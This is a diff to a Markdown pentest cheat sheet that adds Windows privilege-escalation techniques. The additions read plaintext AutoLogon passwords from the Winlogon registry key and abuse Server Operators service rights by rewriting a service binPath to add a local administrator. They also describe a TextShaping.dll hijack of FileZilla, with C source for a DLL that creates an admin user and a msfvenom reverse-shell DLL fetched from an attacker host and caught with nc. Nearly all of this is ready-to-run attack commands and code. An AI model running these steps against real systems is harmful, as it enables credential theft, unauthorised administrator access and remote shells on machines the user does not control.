@@ -11,7 +11,7 @@ tags: [Windows, PrivilegeEscalation]
 
 ## Quick Checks
 
-#Shell #Windows #PrivilegeEscalation
+#Shell #Windows #PrivilegeEscalation #Looting
 Quick Windows privesc checklist for user context, services, installer policy, and interesting software paths.
 
 ```powershell
@@ -94,6 +94,20 @@ Check autorun registry keys for writable executable paths or command values that
 ```cmd
 reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
 reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+```
+
+## Winlogon Saved Credentials
+
+#Shell #Windows #Looting #PrivilegeEscalation
+Check AutoLogon values for plaintext credentials that can be reused locally or laterally.
+
+```cmd
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+
+:: High-signal values to review.
+:: DefaultDomainName
+:: DefaultUserName
+:: DefaultPassword
 ```
 
 ## Writable Service / Binary Hijack
@@ -248,6 +262,27 @@ accesschk.exe -accepteula -uwdq "C:\Program Files\"
 
 :: Check writable service registry keys.
 accesschk.exe -accepteula -uvwk HKLM\System\CurrentControlSet\Services
+```
+
+## Server Operators Service Abuse
+
+#Shell #Windows #PrivilegeEscalation
+If your account can control services, such as through the `Server Operators` group, change a service `binPath` to add your user to local administrators.
+
+```cmd
+:: Confirm broad service control rights.
+accesschk.exe -cuwqv "<USER>" * /accepteula
+
+:: Inspect one candidate service running as LocalSystem.
+sc qc <SERVICE_NAME>
+accesschk.exe -cuwqv "<USER>" <SERVICE_NAME>
+
+:: Change the service command and trigger it.
+sc config <SERVICE_NAME> binPath= "cmd /c net localgroup Administrators <USER> /add"
+sc start <SERVICE_NAME>
+
+:: Confirm local admin membership.
+net localgroup Administrators
 ```
 
 ## AlwaysInstallElevated
@@ -410,6 +445,74 @@ sc stop <SERVICE_NAME>
 sc start <SERVICE_NAME>
 shutdown /s /f /t 0
 ```
+
+### TextShaping DLL Hijack
+
+#### When
+
+- A privileged Windows application loads `TextShaping.dll`.
+- You can write to the application's install directory.
+- Restarting the application or service causes the DLL to load again.
+
+#### Add Local Admin DLL
+
+#Shell #Windows #PrivilegeEscalation
+Step-by-step `TextShaping.dll` hijack to add a local admin user.
+
+```sh
+# 1. Attacker: create TextShaping.cpp with the local-admin DLL body.
+cat > TextShaping.cpp <<'EOF'
+#include <stdlib.h>
+#include <windows.h>
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
+        system("net user <USER> <PASS> /add");
+        system("net localgroup Administrators <USER> /add");
+    }
+    return TRUE;
+}
+EOF
+
+# 2. Attacker: compile and host the DLL.
+x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
+python -m http.server 80
+
+# 3. Target PowerShell: replace the writable DLL in the FileZilla directory.
+iwr -Uri http://<LHOST>/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
+
+# 4. Target PowerShell: restart the application so the hijacked DLL is loaded.
+Stop-Process -Name filezilla -Force
+Start-Process 'C:\FileZilla\FileZilla FTP Client\filezilla.exe'
+whoami
+```
+
+#### Reverse Shell DLL
+
+#Shell #Windows #PrivilegeEscalation
+Step-by-step `TextShaping.dll` hijack to get a reverse shell instead of adding a user.
+
+```sh
+# 1. Attacker: generate a DLL reverse shell payload.
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o TextShaping.dll
+
+# 2. Attacker: start a listener and host the DLL.
+nc -lvnp <LPORT>
+python -m http.server 80
+
+# 3. Target PowerShell: replace the writable DLL in the FileZilla directory.
+iwr -Uri http://<LHOST>/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
+
+# 4. Target PowerShell: restart the application to trigger the payload.
+Stop-Process -Name filezilla -Force
+Start-Process 'C:\FileZilla\FileZilla FTP Client\filezilla.exe'
+```
+
+#### TextShaping Notes
+
+- Validate the DLL load path first with Procmon or another process monitor.
+- This is most useful when the application starts elevated or as another user.
+- If the app is launched by a low-privileged user, the shell/user you get will match that context.
 
 ## XAMPP MySQL Local-Only Pivot
 
